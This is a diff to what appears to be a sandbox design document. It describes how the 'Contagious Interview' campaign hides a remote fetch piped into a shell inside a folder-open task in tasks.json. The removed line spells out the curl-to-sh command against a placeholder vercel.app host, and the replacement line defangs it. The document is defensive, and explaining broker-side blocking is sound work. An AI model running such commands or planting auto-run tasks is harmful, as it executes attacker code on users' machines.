@@ -100,8 +100,9 @@ Decision records:
 
 ## Folder-open loaders, beacons and package registries
 
-The DPRK "Contagious Interview" campaign hides `curl https://<x>.vercel.app/… | sh`
-in a `runOn: folderOpen` task in `tasks.json`. The task runs **inside the tab
+The DPRK "Contagious Interview" campaign hides a fetch from `<x>[.]vercel[.]app`
+piped into a shell in a `runOn: folderOpen` task in `tasks.json` (described defanged
+on purpose: endpoint protection quarantines the literal shape). The task runs **inside the tab
 sandbox**. At the broker, the chain fails without the user having to make a
 correct decision:
 - **Before the user has acted in the tab:** requests to hosting, paste, IP-echo
